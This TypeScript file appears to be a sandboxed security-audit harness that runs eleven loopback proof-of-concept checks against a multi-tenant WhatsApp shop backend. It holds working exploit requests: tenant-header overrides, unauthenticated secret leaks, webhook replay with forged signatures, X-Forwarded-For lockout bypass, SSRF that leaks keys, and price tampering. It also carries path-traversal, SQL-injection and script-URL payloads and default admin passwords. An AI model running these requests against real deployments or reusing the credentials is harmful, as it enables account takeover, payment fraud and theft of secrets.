import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import crypto from 'node:crypto';

const SBOX_TARGET = process.env.SBOX_TARGET || '/tmp/sbox_ro';
const WORKDIR = process.env.SBOX_WORKDIR || process.cwd();
const SCRATCH_OUT = process.env.SBOX_OUT || '/tmp/local-poc-results.json';

fs.mkdirSync(WORKDIR, { recursive: true });
process.chdir(WORKDIR);

async function main() {
  const results: Record<string, any> = {
    meta: {
      executedAt: new Date().toISOString(),
      targetReadOnlyRoot: SBOX_TARGET,
      scratchWorkdir: WORKDIR,
      networkMode: 'unshare-isolated-loopback-only',
    },
    checks: {},
  };

  // Start a dummy loopback downstream HTTP server to capture outbound requests
  const capturedOutbound: Array<{ method: string; url: string; headers: Record<string, any>; body: string }> = [];
  const dummyDownstream = http.createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const bodyStr = Buffer.concat(chunks).toString('utf8');
      capturedOutbound.push({
        method: req.method || 'GET',
        url: req.url || '/',
        headers: req.headers,
        body: bodyStr,
      });

      res.setHeader('Content-Type', 'application/json');
      if ((req.url || '').includes('/api/v1/balance')) {
        return res.end(JSON.stringify({ success: true, data: { balance: 100000, balance_hold: 0 } }));
      }
      if ((req.url || '').includes('/api/v1/me')) {
        return res.end(JSON.stringify({ id: 1, balance: 500000, username: 'dummy_xaviera' }));
      }
      if ((req.url || '').includes('/api/v1/transaction/create')) {
        let parsed: any = {};
        try { parsed = JSON.parse(bodyStr); } catch {}
        return res.end(JSON.stringify({
          success: true,
          data: {
            trx_id: 'TRX-LOOP-' + Date.now(),
            order_id: parsed.order_id,
            amount: Number(parsed.amount || 0),
            unique_code: 0,
            total_amount: Number(parsed.amount || 0),
            status: 'pending',
            qris_string: '000201010211',
            qr_url: 'http://127.0.0.1/qr.png',
            payment_url: 'http://127.0.0.1/pay/1',
            expired_at: new Date(Date.now() + 600000).toISOString(),
          },
        }));
      }
      return res.end(JSON.stringify({ ok: true, result: { message_id: 101 } }));
    });
  });

  await new Promise<void>((resolve) => dummyDownstream.listen(0, '127.0.0.1', resolve));
  const dummyAddr = dummyDownstream.address() as any;
  const dummyBase = `http://127.0.0.1:${dummyAddr.port}`;

  // Import target serverApp and modules read-only from SBOX_TARGET
  const { serverApp } = await import(`${SBOX_TARGET}/backend/app.ts`);
  const { getMasterDb, hashPassword: masterHash } = await import(`${SBOX_TARGET}/admin-backend/database/masterSqlite.ts`);
  const { AdminAuthService, impersonationTokens } = await import(`${SBOX_TARGET}/admin-backend/services/adminAuthService.ts`);
  const { TenantService } = await import(`${SBOX_TARGET}/admin-backend/services/tenantService.ts`);
  const { generateRandomPassword } = await import(`${SBOX_TARGET}/admin-backend/utils/generatorUtils.ts`);
  const { createSession, getSession, updateTenantPassword } = await import(`${SBOX_TARGET}/backend/services/authManager.ts`);
  const { recordTransaction } = await import(`${SBOX_TARGET}/backend/services/transactionManager.ts`);
  const { runWithTenant } = await import(`${SBOX_TARGET}/backend/database/tenantContext.ts`);
  const { createPromoCode, validateAndApplyPromo, getPromoCodeByCode, db: tenantDbProxy } = await import(`${SBOX_TARGET}/backend/database/sqlite.ts`);
  const { dispatchIncomingMessages, activeCheckoutSessions } = await import(`${SBOX_TARGET}/backend/handlers/messageDispatcher.ts`);
  const { getPicturePath } = await import(`${SBOX_TARGET}/backend/services/mediaManager.ts`);
  const { isGroupParticipantAdmin } = await import(`${SBOX_TARGET}/backend/handlers/hideTagUtils.ts`);
  const { stopLunasQrisPolling } = await import(`${SBOX_TARGET}/backend/services/lunasQrisService.ts`);
  const { notifyTransactionPaid } = await import(`${SBOX_TARGET}/backend/services/telegramService.ts`);

  const targetServer = http.createServer(serverApp);
  await new Promise<void>((resolve) => targetServer.listen(0, '127.0.0.1', resolve));
  const targetAddr = targetServer.address() as any;
  const baseUrl = `http://127.0.0.1:${targetAddr.port}`;

  // Create dummy victim tenant & dummy attacker tenant
  const victimTenant = TenantService.createTenant({
    store_name: 'Dummy Victim Store',
    owner_name: 'Victim Owner',
    owner_phone: '6281111111111',
    username: 'victim_user_01',
    password: 'VictimPassword!99',
    duration_value: 30,
    duration_unit: 'days',
  });
  const attackerTenant = TenantService.createTenant({
    store_name: 'Dummy Attacker Store',
    owner_name: 'Attacker Owner',
    owner_phone: '6282222222222',
    username: 'attacker_user_01',
    password: 'AttackerPassword!99',
    duration_value: 30,
    duration_unit: 'days',
  });

  // Seed dummy secrets on victim tenant
  await fetch(`${baseUrl}/api/bot/save-config?tenant=${victimTenant.tenant_id}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      xavieraApiKey: 'DUMMY_XAVIERA_VICTIM_SECRET',
      xavieraBaseUrl: dummyBase,
      lunasQrisApiKey: 'DUMMY_LUNAS_VICTIM_SECRET',
      lunasQrisSecretKey: '',
      lunasQrisBaseUrl: dummyBase,
    }),
  });
  await fetch(`${baseUrl}/api/bot/telegram/config?tenant=${victimTenant.tenant_id}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      botToken: '123456:DUMMY_TG_TOKEN',
      chatId: '999888777',
      notifEnabled: true,
    }),
  });

  // CHK-01: Unauthenticated multi-tenant API access, X-Tenant-Id override, & arbitrary tenant DB instantiation
  {
    const attackerToken = createSession('attacker_user_01', attackerTenant.tenant_id);
    const unauthStatus = await fetch(`${baseUrl}/api/bot/status?tenant=${victimTenant.tenant_id}`).then((r) => r.json());
    const overrideRes = await fetch(`${baseUrl}/api/bot/status`, {
      headers: {
        Authorization: `Bearer ${attackerToken}`,
        'X-Tenant-Id': victimTenant.tenant_id,
      },
    }).then((r) => r.json());
    const ghostTenantId = 'ghost_unlisted_tenant_999';
    const ghostStatus = await fetch(`${baseUrl}/api/bot/status?tenant=${ghostTenantId}`).then((r) => r.json());
    const ghostDbExists = fs.existsSync(path.join(WORKDIR, 'database', 'tenants', `${ghostTenantId}.db`));
    const unauthPricing = await fetch(`${baseUrl}/api/pricing?tenant=${victimTenant.tenant_id}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mode: 'rp', value: 1 }),
    }).then((r) => r.json());

    results.checks.CHK_01_multi_tenant_auth_and_isolation = {
      unauthStatusTenantId: unauthStatus.tenantId,
      unauthLeakedXavieraKey: unauthStatus.config?.xavieraApiKey,
      unauthLeakedLunasKey: unauthStatus.config?.lunasQrisApiKey,
      bearerPlusHeaderOverrideResolvedTenant: overrideRes.tenantId,
      ghostTenantAccountStatus: ghostStatus.accountStatus,
      ghostTenantDbCreatedOnDisk: ghostDbExists,
      unauthPricingMutationSuccess: unauthPricing.success,
      unauthPricingUpdatedValue: unauthPricing.value,
    };
  }

  // CHK-02: Unauthenticated authRoutes username takeover, store-setup overwrite, & telegram config leak/write
  {
    const tgGetBefore = await fetch(`${baseUrl}/api/bot/telegram/config?tenant=${victimTenant.tenant_id}`).then((r) => r.json());
    const usernameHijack = await fetch(`${baseUrl}/api/auth/profile/update-username`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Tenant-Id': victimTenant.tenant_id,
      },
      body: JSON.stringify({ newUsername: 'hijacked_victim_99' }),
    }).then((r) => r.json());
    const storeOverwrite = await fetch(`${baseUrl}/api/auth/store-setup`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Tenant-Id': victimTenant.tenant_id,
      },
      body: JSON.stringify({ storeName: 'Overwritten Store', ownerName: 'Anon', ownerNumber: '081234567890' }),
    }).then((r) => r.json());

    results.checks.CHK_02_unauth_profile_and_telegram = {
      unauthTelegramLeakedToken: tgGetBefore.config?.botToken,
      unauthTelegramLeakedChatId: tgGetBefore.config?.chatId,
      unauthUpdateUsernameSuccess: usernameHijack.success,
      unauthUpdateUsernameNewName: usernameHijack.username,
      unauthStoreSetupSuccess: storeOverwrite.success,
      unauthStoreSetupName: storeOverwrite.storeInfo?.storeName,
    };
  }

  // CHK-03: Legacy /api/apartment/* unauthenticated read endpoints
  {
    const statsRes = await fetch(`${baseUrl}/api/apartment/stats`);
    const statsBody = await statsRes.json();
    const tenantsRes = await fetch(`${baseUrl}/api/apartment/tenants`);
    const tenantsBody = await tenantsRes.json();
    const leaseRes = await fetch(`${baseUrl}/api/apartment/current-lease`);
    results.checks.CHK_03_apartment_unauth_reads = {
      statsHttpStatus: statsRes.status,
      statsSuccess: statsBody.success,
      tenantsHttpStatus: tenantsRes.status,
      tenantsCount: Array.isArray(tenantsBody.data) ? tenantsBody.data.length : 0,
      currentLeaseHttpStatus: leaseRes.status,
    };
  }

  // CHK-04: LunasQRIS webhook fail-open when secret empty, stale timestamp replay, & missing amount verification
  {
    runWithTenant(victimTenant.tenant_id, () => {
      recordTransaction({
        orderId: 'ORD-WH-OPEN',
        trxId: 'TRX-WH-OPEN',
        customerNumber: '6281111',
        customerName: 'Dummy',
        productName: 'TestProd',
        variantName: 'Var1',
        nominal: 50000,
        uniqueCode: 0,
        total: 50000,
        paymentUrl: 'http://127.0.0.1/pay',
        status: 'pending',
      });
    });

    const whOpenRes = await fetch(`${baseUrl}/api/lunasqris/webhook?tenant=${victimTenant.tenant_id}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ event: 'transaction.paid', data: { order_id: 'ORD-WH-OPEN', status: 'paid' } }),
    });
    const orderOpenAfter = runWithTenant(victimTenant.tenant_id, () =>
      tenantDbProxy.prepare('SELECT status FROM transactions WHERE order_id = ?').get('ORD-WH-OPEN') as any
    );

    await fetch(`${baseUrl}/api/bot/save-config?tenant=${victimTenant.tenant_id}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ lunasQrisSecretKey: 'DUMMY_WEBHOOK_SECRET_KEY' }),
    });
    runWithTenant(victimTenant.tenant_id, () => {
      recordTransaction({
        orderId: 'ORD-WH-REPLAY',
        trxId: 'TRX-WH-REPLAY',
        customerNumber: '6281111',
        customerName: 'Dummy',
        productName: 'ExpensiveProd',
        variantName: 'Var1',
        nominal: 100000,
        uniqueCode: 0,
        total: 100000,
        paymentUrl: 'http://127.0.0.1/pay',
        status: 'pending',
      });
    });
    const replayPayload = JSON.stringify({
      event: 'transaction.paid',
      data: { order_id: 'ORD-WH-REPLAY', status: 'paid', amount: 1, total_amount: 1 },
    });
    const staleTimestamp = '1000000000';
    const validSig = crypto
      .createHmac('sha256', 'DUMMY_WEBHOOK_SECRET_KEY')
      .update(`${staleTimestamp}.${replayPayload}`)
      .digest('hex');
    const whReplayRes = await fetch(`${baseUrl}/api/lunasqris/webhook?tenant=${victimTenant.tenant_id}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Callback-Timestamp': staleTimestamp,
        'X-Callback-Signature': validSig,
      },
      body: replayPayload,
    });
    const orderReplayAfter = runWithTenant(victimTenant.tenant_id, () =>
      tenantDbProxy.prepare('SELECT status FROM transactions WHERE order_id = ?').get('ORD-WH-REPLAY') as any
    );

    results.checks.CHK_04_lunasqris_webhook = {
      failOpenHttpStatus: whOpenRes.status,
      failOpenOrderStatus: orderOpenAfter?.status,
      staleTsAndMismatchAmountHttpStatus: whReplayRes.status,
      staleTsAndMismatchAmountOrderStatus: orderReplayAfter?.status,
    };
  }

  // CHK-05: WhatsApp order_var client-controlled price tampering
  {
    capturedOutbound.length = 0;
    const mockSock: any = {
      user: { id: '628000000@s.whatsapp.net', name: 'Bot' },
      sendMessage: async () => ({ key: { id: 'BOT-' + Date.now() } }),
    };
    const mockConfig: any = {
      storeInfo: { storeName: 'Dummy', ownerName: 'Owner', ownerNumber: '628111' },
      lunasQrisApiKey: 'DUMMY_LUNAS_KEY',
      lunasQrisBaseUrl: dummyBase,
      xavieraApiKey: '',
      pricingConfig: { mode: 'rp', value: 0 },
    };
    const buyerJid = '628999999999@s.whatsapp.net';
    const deps = { addLog: () => {}, resolveTargetJid: (j: string) => j };
    const nowTs = Math.floor(Date.now() / 1000);

    await runWithTenant(victimTenant.tenant_id, async () => {
      await dispatchIncomingMessages(
        mockSock,
        mockConfig,
        [
          {
            key: { id: 'MSG-TAMPER-1', remoteJid: buyerJid, fromMe: false },
            messageTimestamp: nowTs,
            pushName: 'DummyBuyer',
            message: {
              buttonsResponseMessage: {
                selectedButtonId: 'order_var:Netflix%20Premium|1%20Bulan%20Private|1',
                selectedDisplayText: 'Order',
              },
            },
          },
        ],
        'notify',
        deps
      );
      const sessionAfterOrderVar = activeCheckoutSessions.get(buyerJid);
      await dispatchIncomingMessages(
        mockSock,
        mockConfig,
        [
          {
            key: { id: 'MSG-TAMPER-2', remoteJid: buyerJid, fromMe: false },
            messageTimestamp: nowTs,
            pushName: 'DummyBuyer',
            message: {
              buttonsResponseMessage: {
                selectedButtonId: 'checkout_direct',
                selectedDisplayText: 'Bayar',
              },
            },
          },
        ],
        'notify',
        deps
      );

      const createReq = capturedOutbound.find((r) => r.url.includes('/api/v1/transaction/create'));
      const createPayload = createReq ? JSON.parse(createReq.body) : null;
      if (createPayload?.order_id) stopLunasQrisPolling(createPayload.order_id);

      results.checks.CHK_05_order_var_price_tampering = {
        sessionPriceParsedFromButton: sessionAfterOrderVar?.price,
        invoiceOrderId: createPayload?.order_id,
        invoiceAmountSentToGateway: createPayload?.amount,
      };
    });
  }

  // CHK-06: X-Forwarded-For spoofing bypasses Master Admin login lockout & Partner API rate limiter
  {
    const statusesSameIp: number[] = [];
    for (let i = 0; i < 6; i++) {
      const r = await fetch(`${baseUrl}/api/admin/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Forwarded-For': '198.51.100.1',
        },
        body: JSON.stringify({ username: 'wan_admin773', password: 'wrong-password-' + i }),
      });
      statusesSameIp.push(r.status);
    }
    const spoofedAttempt = await fetch(`${baseUrl}/api/admin/auth/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': '198.51.100.2',
      },
      body: JSON.stringify({ username: 'wan_admin773', password: 'wrong-password-new' }),
    });

    let partnerBlockedStatus = 0;
    for (let i = 0; i < 61; i++) {
      const pr = await fetch(`${baseUrl}/api/v1/partner/tokens/create`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': 'invalid_key_test',
          'X-Forwarded-For': '198.51.100.50',
        },
        body: JSON.stringify({}),
      });
      partnerBlockedStatus = pr.status;
    }
    const partnerSpoofed = await fetch(`${baseUrl}/api/v1/partner/tokens/create`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': 'invalid_key_test',
        'X-Forwarded-For': '198.51.100.51',
      },
      body: JSON.stringify({}),
    });

    results.checks.CHK_06_xff_lockout_and_ratelimit_bypass = {
      adminLoginSameIpStatuses: statusesSameIp,
      adminLoginRotatedXffStatus: spoofedAttempt.status,
      partner61stSameIpStatus: partnerBlockedStatus,
      partnerRotatedXffStatus: partnerSpoofed.status,
    };
  }

  // CHK-07: SSRF & merchant key exfiltration via baseurl query param & stored xavieraBaseUrl
  {
    capturedOutbound.length = 0;
    await fetch(`${baseUrl}/api/lunasqris/balance?apikey=DUMMY_MERCHANT_SECRET&baseurl=${encodeURIComponent(dummyBase)}`);
    await fetch(`${baseUrl}/api/xaviera/profile?tenant=${victimTenant.tenant_id}`);
    const lunasOutbound = capturedOutbound.find((r) => r.url === '/api/v1/balance');
    const xavieraOutbound = capturedOutbound.find((r) => r.url === '/me' || r.url === '/api/v1/me');

    results.checks.CHK_07_ssrf_and_key_exfil = {
      lunasQrisTargetPath: lunasOutbound?.url,
      lunasQrisExfiltratedApiKeyHeader: lunasOutbound?.headers['x-api-key'],
      xavieraTargetPath: xavieraOutbound?.url,
      xavieraExfiltratedBearerHeader: xavieraOutbound?.headers['authorization'],
    };
  }

  // CHK-08: Promo code quota race condition
  {
    runWithTenant(victimTenant.tenant_id, () => {
      const promo = createPromoCode({
        code: 'RACEONE',
        discountMode: 'rp',
        discountValue: 500,
        minSpend: 0,
        quota: 1,
        isForever: true,
        scopeType: 'all',
        variantIds: [],
      });
      const r1 = validateAndApplyPromo({
        code: 'RACEONE',
        variantId: 'Prod|Var',
        basePrice: 1000,
        initialMargin: 1000,
        totalOrderAmount: 2000,
        isApkPremium: true,
      });
      const r2 = validateAndApplyPromo({
        code: 'RACEONE',
        variantId: 'Prod|Var',
        basePrice: 1000,
        initialMargin: 1000,
        totalOrderAmount: 2000,
        isApkPremium: true,
      });
      tenantDbProxy.prepare('UPDATE promo_codes SET used_count = used_count + 1 WHERE id = ?').run(promo.id);
      tenantDbProxy.prepare('UPDATE promo_codes SET used_count = used_count + 1 WHERE id = ?').run(promo.id);
      const after = getPromoCodeByCode('RACEONE');

      results.checks.CHK_08_promo_quota_oversubscription = {
        configuredQuota: after?.quota,
        firstValidationIsValid: r1.isValid,
        secondValidationIsValid: r2.isValid,
        finalUsedCountExceedingQuota: after?.usedCount,
      };
    });
  }

  // CHK-09: Weak crypto, default accounts, non-revoked sessions/impersonation, & cookie flags
  {
    const db = getMasterDb();
    const superAdminRow = db.prepare("SELECT username FROM super_admins WHERE username = 'wan_admin773'").get() as any;
    const defaultHash1 = masterHash('Obsidian@7X_Nova');
    const defaultHash2 = masterHash('Obsidian@7X_Nova');

    const victimTok = createSession('victim_user_01', victimTenant.tenant_id);
    const updatePwRes = runWithTenant(victimTenant.tenant_id, () =>
      updateTenantPassword(victimTenant.tenant_id, 'victim_user_01', 'VictimPassword!99', 'NewVictimPw!2026', 'NewVictimPw!2026')
    );
    const oldSessionStillActive = Boolean(getSession(victimTok));

    const adminLogin = AdminAuthService.login('wan_admin773', 'Obsidian@7X_Nova', '127.0.0.1');
    const impToken = AdminAuthService.createImpersonationToken(victimTenant.tenant_id);
    AdminAuthService.logout(`Bearer ${adminLogin.token}`);
    const impTokenStillActiveAfterAdminLogout = impersonationTokens.has(impToken);

    const tenantLoginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'admin', password: 'admin123' }),
    });
    const setCookies = tenantLoginRes.headers.getSetCookie ? tenantLoginRes.headers.getSetCookie() : [];

    results.checks.CHK_09_crypto_sessions_cookies = {
      defaultSuperAdminSeeded: Boolean(superAdminRow),
      staticSaltIdenticalHash: defaultHash1 === defaultHash2,
      passwordUpdateSuccess: updatePwRes.success,
      oldTenantSessionStillValidAfterPwChange: oldSessionStillActive,
      impersonationTokenValidAfterAdminLogout: impTokenStillActiveAfterAdminLogout,
      defaultAdminLoginSucceeded: tenantLoginRes.status === 200,
      setCookieHeaders: setCookies,
      generatedPasswordSample: generateRandomPassword(),
    };
  }

  // CHK-10: Telegram HTML interpolation & CORS wildcard & React 19 href protection
  {
    let capturedTgPayload: any = null;
    const origFetch = globalThis.fetch;
    globalThis.fetch = async (input: any, init?: any) => {
      if (typeof input === 'string' && input.startsWith('https://api.telegram.org/')) {
        capturedTgPayload = init?.body ? JSON.parse(String(init.body)) : null;
        return new Response(JSON.stringify({ ok: true, result: { message_id: 202 } }), { status: 200 });
      }
      return origFetch(input, init);
    };
    try {
      await notifyTransactionPaid(victimTenant.tenant_id, {
        orderId: 'ORD-TG-1',
        productName: 'Produk <a href="https://example.test">Link</a>',
        variantName: 'Var',
        totalPrice: 10000,
        buyerNumber: '628123456789',
        storeName: '<b>InjectedStore</b>',
      });
    } finally {
      globalThis.fetch = origFetch;
    }

    const corsRes = await fetch(`${baseUrl}/api/health`, {
      headers: { Origin: 'https://untrusted.example' },
    });
    const acaoHeader = corsRes.headers.get('access-control-allow-origin');

    const React = (await import(`${SBOX_TARGET}/node_modules/react/index.js`)).default;
    const { renderToStaticMarkup } = await import(`${SBOX_TARGET}/node_modules/react-dom/server.node.js`);
    const renderedHref = renderToStaticMarkup(React.createElement('a', { href: 'javascript:alert(1)' }, 'Web'));

    results.checks.CHK_10_telegram_cors_react = {
      telegramParseMode: capturedTgPayload?.parse_mode,
      telegramContainsRawAnchorTag: String(capturedTgPayload?.text || '').includes('<a href="https://example.test">'),
      corsOriginHeaderForUntrustedOrigin: acaoHeader,
      react19RenderedJavascriptHref: renderedHref,
    };
  }

  // CHK-11: Mitigated positive defense checks
  {
    const traversalPath = getPicturePath(victimTenant.tenant_id, '../../etc/passwd');
    const nonAdminCanHideTag = isGroupParticipantAdmin(
      [{ id: '628111@s.whatsapp.net', admin: null }],
      ['628111@s.whatsapp.net']
    );
    const adminCanHideTag = isGroupParticipantAdmin(
      [{ id: '628111@s.whatsapp.net', admin: 'admin' }],
      ['628111@s.whatsapp.net']
    );
    const sqliPromoLookup = runWithTenant(victimTenant.tenant_id, () => getPromoCodeByCode("' OR '1'='1"));

    results.checks.CHK_11_mitigated_controls = {
      mediaTraversalReturnValue: traversalPath,
      hideTagNonAdminAllowed: nonAdminCanHideTag,
      hideTagAdminAllowed: adminCanHideTag,
      sqliPromoLookupResult: sqliPromoLookup,
    };
  }

  targetServer.close();
  dummyDownstream.close();

  fs.writeFileSync(SCRATCH_OUT, JSON.stringify(results, null, 2));
  console.log('ALL_LOCAL_CHECKS_DONE ->', SCRATCH_OUT);
}

main()
  .then(() => process.exit(0))
  .catch((err) => {
    console.error('CHECK_ERROR:', err);
    process.exit(1);
  });
